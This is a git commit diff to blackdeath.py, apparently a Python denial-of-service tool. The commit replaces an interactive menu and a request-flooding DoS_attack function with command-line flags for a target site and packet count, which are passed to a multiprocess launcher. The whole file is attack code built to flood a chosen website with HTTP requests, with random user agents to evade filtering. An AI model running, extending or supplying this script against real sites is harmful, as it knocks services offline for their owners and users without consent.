2be01d72baa9b49fbfafa1d07d80a54056cc5dfd
Top-Of-Tech <67748521+Top-Of-Tech@users.noreply.github.com>
2022-05-19 15:05:20 -0500

    v1.2.0

--- blackdeath.py
+++ blackdeath.py
@@ -1,54 +1,31 @@
 from colorama import init
 from termcolor import colored
-import requests
 import sys
-from fake_useragent import UserAgent
 from src.threads import start_processes
 
 init()
 
-def DoS_attack(site, packets):
-    print(colored("\n[INFO] Starting the DoS attack", "green"))
+site = None
+packets = None
+
+if __name__ == "__main__":
     try:
-        for _ in range(0, packets):
-            requests.get(site, headers={"User-Agent": UserAgent().random})
-    except Exception as e:
-        print(colored(f"[ERROR] {e}", "red"))
+        if "-h" in sys.argv or "--help" in sys.argv or "-help" in sys.argv:
+            print(colored("\n[INFO] Usage: python3 blackdeath.py -s <site> -p <packets>", "green"))
+            sys.exit(0)
 
-def main():
-    try:
-        while True:
-            print(colored("\ns) Start the DoS attack", "green"))
-            print(colored("v) Program version", "green"))
-            print(colored("q) Quit", "green"))
-
-            print(colored("\n>>>", "green"), end="")
-            choice = input()
-
-            if choice == "s":
-                print(colored("\nEnter in the target site: ", "green"), end="")
-                site = input()
-                print(colored("How many packets to send: ", "green"), end="")
-                packets = int(input())
-                
-                start_processes(site, packets)
-
-                print(colored("\n[INFO] Attack complete", "green"))
-            elif choice == "v":
-                print(colored("\nBlackDeath v1.0", "green"))
-            elif choice == "q":
-                break
-            else:
-                print(colored("\nInvalid option", "red"))
+        try:
+            if "-s" in sys.argv and sys.argv.count("-s") == 1:
+                site = sys.argv[sys.argv.index("-s") + 1]
+        except:
+            print(colored("[ERROR] Invalid site value", "red"))
+        try:
+            if "-p" in sys.argv and sys.argv.count("-p") == 1:
+                packets = int(sys.argv[sys.argv.index("-p") + 1])
+        except:
+            print(colored("[ERROR] Invalid packets value", "red"))
+        
+        start_processes(site, packets)
 
     except KeyboardInterrupt:
         sys.exit()
-
-if __name__ == "__main__":
-    print(colored(r""" 
-     ____  _            _    ____             _   _
-    | __ )| | __ _  ___| | _|  _ \  ___  __ _| |_| |__
-    |  _ \| |/ _` |/ __| |/ / | | |/ _ \/ _` | __| '_ \
-    | |_) | | (_| | (__|   <| |_| |  __/ (_| | |_| | | |
-    |____/|_|\__,_|\___|_|\_\____/ \___|\__,_|\__|_| |_|""", "green"))
-    main()
